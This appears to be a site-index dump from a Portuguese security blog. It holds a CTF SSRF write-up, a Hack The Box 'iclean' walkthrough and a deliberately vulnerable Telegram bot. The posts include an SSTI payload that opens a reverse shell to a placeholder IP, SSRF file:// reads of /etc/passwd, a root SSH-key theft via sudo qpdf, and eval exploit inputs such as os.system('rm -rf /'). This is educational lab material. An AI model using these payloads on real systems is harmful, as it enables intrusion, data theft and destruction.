[{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/authors/edson/","section":"Authors","summary":"","title":"Edson","type":"authors"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box","type":"tags"},{"content":"","date":"5 September 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" CTF Doryl # Como acessar o desafio # Acesse o https://github.com/fguisso/doryl-site-check, e inicie o desafio na sua máquina. No caso foi entregue a versão na branch Internal. Descrição # O Desafio tem como objetivos:\nEncontrar um arquivo com informações muito sensiveis. Encontrar uma flag no formato secDevOps{\u0026hellip;..} Como Funciona a Aplicação # A aplicação possui apenas um campo de entrada, utilizado para escanear a url inserida: -Note que ele retorna a resposta completa da url que o usuário inseriu.\nEntão parece que a aplicação internamente envia requisições para a url. Nesse princípio é possível inserir uma URL para tentar acessar servidores internos, como o http://localhost.\nUtilize as portas web mais utilizadas em um bruteforce, para saber se existe alguma porta interna aberta: 80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017.\nUtilize o ffuf para automatizar a buscar de portas o input é enviado no parâmetro target para o servidor, e note que filtrei as respostas que possuem 3246 palavras que considerei como resposta padrão do site.\nffuf -u http://0.0.0.0:8080/check -X POST -d \u0026quot;target=http%3A%2F%2Flocalhost%3AFUZZ\u0026quot; -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246\nNote que ele encontrou apenas 2 portas abertas a 8080, que fornece o site principal, e a 3000, que fornece uma aplicação interna. Analise a resposta completa, quando você insere http://localhost:3000, GET http://localhost:3000 Content-Length: 93 Content-Type: text/html; charset=utf-8 Date: Thu, 05 Sep 2024 05:46:30 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT \u0026lt;pre\u0026gt; \u0026lt;a href=\u0026#34;employers.html\u0026#34;\u0026gt;employers.html\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;logins.txt\u0026#34;\u0026gt;logins.txt\u0026lt;/a\u0026gt; \u0026lt;/pre\u0026gt; Note que ele possui um link para logins.txt, ao enviar a url http://localhost:3000/logins.txt no input, ele irá retornar informações muito sensíveis. GET http://localhost:3000/logins.txt Accept-Ranges: bytes Content-Length: 233 Content-Type: text/plain; charset=utf-8 Date: Thu, 05 Sep 2024 05:50:52 GMT Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT // Super sensitive information // WiFi id: Doryl password: 2022doryl@* // Guest WiFi id: Doryl-Guest password: dorylguest2022 // Intranet login: admin password: Adminqwert2022 // Ginpass login: dorylAdmin password: ginAndOrange Primeira Etapa Concluída # Encontre a FLAG # Observe que o servidor envia uma requisição interna para a URL inserida, utilizando o protocolo http. Com base nisso, podemos testar outros esquemas comuns para acessar arquivos em servidores internos, como o esquema file.\nVamos tentar recuperar um arquivo comum em servidores Linux, o /etc/passwd, para verificar se ele retorna o conteúdo. Insira no campo de entrada a URL file:///etc/passwd.\nGET file:///etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin Essa resposta, é o conteúdo do /etc/passwd , então podemos tentar recuperar a flag que está armazenada no sistema. É comum em ctfs a flag ficar na mesma pasta do desafio e com o nome flag.txt , partindo deste princípio podemos inserir file://./flag.txt . GET file://./flag.txt SecDevOps{SSRF_3_UM_PERIGOnvim .!} Todos Objetivos foram concluidos ( ;\n|Criador do Desafio: https://github.com/fguisso\n","date":"5 September 2024","externalUrl":null,"permalink":"/posts/doryl-writeup/","section":"Posts","summary":"Resolução do desafio Doryl site-check","title":"Write Up - Doryl Site-Check","type":"posts"},{"content":" Reconhecimento # A princípio realizamos o mapeamento das portas abertas no nosso alvo, bem como seus serviços e versões.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) Ao tentar acessar o servidor WEB, nós somos redirecionados para o domínio capiclean.htb. Dessa forma, adicionamos a seguinte linha no nosso arquivo /etc/hosts para que esse domínio consiga ser resolvido.\necho \u0026#34;10.10.11.12 capiclean.htb\u0026#34; | sudo tee -a /etc/hosts Após acessar a aplicação e realizarmos uma busca na aplicação por vulnerabilidades, e nos deparamos com o endpoint \u0026ldquo;http://capiclean.htb/quote\u0026rdquo; que trouxe uma mensagem suspeita:\nYour quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services Ao ler esta mensagem, automaticamente verificamos se algum parâmetro da request enviada para o admin, vulnerável a XSS, pois se fosse o caso nós poderíamos fazer a exfiltração do seu token e utilizar a app com privilégio máximo.\nUtilizamos os payload acima para enviar o token de sessão do admin para um servidor web que que levantamos com python utilizando o comando\npython3 -m http.server Como resultado desse processo, obtivemos o token de sessão do admin Acesso inicial # De posse do token, enumeramos mais alguns endpoint da aplicação\nffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ E encontramos o endpoint \u0026lsquo;dashboard\u0026rsquo; que tem acesso restrito. Dessa forma, adicionamos o cookie de admin no browser e conseguimos acessar o endpoint.\nSeguindo o \u0026lsquo;happy path\u0026rsquo; da aplicação nós geramos um invoice, e posteriormente tentamos acessá-lo por meio da função de geração de QRcode. Analisando os parâmetros request, nós identificamos um SSTI no parâmetro \u0026lsquo;qr_link\u0026rsquo;\nUma vez que identificamos esta vulnerabilidade, nós iniciamos os testes com payloads diversos para conseguir uma shell reversa. O payload a seguir foi o que nos possibilitou acessar o sistema\n{{request|attr(\u0026#34;application\u0026#34;)|attr(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/Nosso_IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}} Escalação de privilégio # Uma vez que conseguimos executar código na máquina alvo, realizamos uma varredura na em sua infraestrutura. Começamos pelo código fonte da aplicação. Nele encontramos algumas credenciais de banco de dados:\ndb_config = { \u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;, \u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39; } Ao verificarmos as portas abertas na aplicação, percebeu-se que a porta 3306 estava aberta. Indicando que existe um banco MySQL em execução. De posse dessa informação utilizamos as credenciais antes encontradas no código para assim consegui ter acesso aos dados do banco\nmysql --database capiclean -e \u0026#39;show databases;\u0026#39; -u iclean -p Após isso, tentamos quebrar ambas as hashs e tivemos sucesso em quebrar apenas a hash do usuário \u0026lsquo;consuela\u0026rsquo; que resultou na senha \u0026lsquo;simple and clean\u0026rsquo;. Com a senha e o usuário foi feita a tentativa de logins via ssh.\nssh consuela@$rhost Que foi bem sucedida. Agora com a shell ssh verificamos se algum comando habilitado a ser executado com privilégio de sudo.\nsudo -l Após entender do que se trata a plicação. Fizemos a seguinte suposição, se o usuário consuela tem ssh, o usuário root também deve ter ssh. Sendo sua chave privada armazenada no arquivo /root/.ssh/id_rsa, nós poderíamos mandar criar um pdf com o conteúdo da chave ssh do usuário root e direcionarmos esse pdf para um diretório acessível.\nsudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa Após a suposição se mostrar verdadeira, nós resgatamos a chave ssh ao verificar o conteúdo interno do pdf, nós realizamos o login via root por meio do comando\nssh root@$rhost -i root_ssh_key_file Com isso nós temos acesso ao usuário root e podemos ver a última flag\ncat root.txt ","date":"20 August 2024","externalUrl":null,"permalink":"/posts/htb-iclean/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - iclean","type":"posts"},{"content":"","date":"20 August 2024","externalUrl":null,"permalink":"/authors/paixao/","section":"Authors","summary":"","title":"Paixao","type":"authors"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/appsec/","section":"Tags","summary":"","title":"Appsec","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/appsec/","section":"Categories","summary":"","title":"AppSec","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/guisso/","section":"Authors","summary":"","title":"Guisso","type":"authors"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/injection/","section":"Categories","summary":"","title":"Injection","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/owasp/","section":"Tags","summary":"","title":"Owasp","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/owasp/","section":"Categories","summary":"","title":"OWASP","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/pt-br/","section":"Tags","summary":"","title":"Pt-Br","type":"tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/python/","section":"Categories","summary":"","title":"Python","type":"categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":" Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot. O bot inclui uma vulnerabilidade na função echo, que avalia qualquer entrada de texto recebida, potencialmente levando a ataques de injeção de código.\nExecutando o Projeto # Siga estas etapas para executar o projeto localmente:\nClone o repositório:\ngit clone https://github.com/fguisso/python-injection Instale as dependências necessárias:\npip install python-telegram-bot Obtenha um Token de Bot do Telegram:\nInicie uma conversa com BotFather no Telegram. Você pode encontrá-lo pesquisando por \u0026ldquo;@BotFather\u0026rdquo; na barra de pesquisa do Telegram ou clicando aqui. Envie o comando /newbot para iniciar o processo de criação de um novo bot. Siga as instruções para escolher um nome e um username para o seu bot. Após criar o bot, o BotFather irá fornecer um token. Copie esse token. Defina o Token do Bot como uma Variável de Ambiente:\nexport TOKEN_TELEGRAM=\u0026#34;seu_token_do_bot_aqui\u0026#34; Execute o script Python:\npython main.py Interaja com o bot no Telegram.\nFuncionamento do Bot # O bot está configurado para receber mensagens contendo operações matemáticas como entrada. Essas operações são resolvidas no comando echo, que retorna o resultado da operação como resposta.\nPor exemplo, ao enviar a mensagem 2 + 2 para o bot, ele retornará 4. Isso pode ser útil para realizar cálculos simples diretamente no Telegram.\nExplicação da vulnerabilidade # As vulnerabilidades de injeção estão entre as principais preocupações de segurança de aplicativos da web. De acordo com o OWASP Top 10, a injeção de código (como SQL injection, XSS, Command Injection e outras) é uma das principais ameaças para a segurança dos aplicativos.\nNo contexto deste bot, a vulnerabilidade de injeção ocorre na função echo, que utiliza a função eval para evoluir qualquer entrada de texto recebida. Isso permite que possíveis atacantes executem código arbitrário enviando uma entrada maliciosa. Exploits são os códigos maliciosos usados para atacar o sistemas e neste cenario estes são alguns exemplos de exploits que você pode enviar para seu bot que serão executados na maquina onde o seu bot esta rodando:\nMensagem para o bot Resultado do exploit os.getenv(\u0026quot;TOKEN_TELEGRAM\u0026quot;) Acesso a variáveis de ambiente os.system(\u0026quot;rm -rf /\u0026quot;) Execução de comandos do sistema operacional, no caso, rm vai deletar todos os arquivos do sistema. import malicious_module Importação de módulos maliciosos __import__(\u0026quot;malicious_module\u0026quot;).malicious_function() Execução de código malicioso. Os usuários são encorajados a testar esses exploits em seu próprio bot e observar os resultados. No entanto, tenha cuidado ao usar exploits, pois eles podem causar danos ao sistema.\nDocumentação # python-telegram-bot Documentation Telegram Bot API Documentation Telegram BotFather Documentation OWASP Top 10 ","date":"23 March 2024","externalUrl":null,"permalink":"/posts/python-injection/","section":"Posts","summary":"","title":"Python Injection","type":"posts"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/telegram/","section":"Categories","summary":"","title":"Telegram","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/en/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/en/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/en/","section":"Sunsec","summary":"","title":"Sunsec","type":"page"},{"content":"","externalUrl":null,"permalink":"/en/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]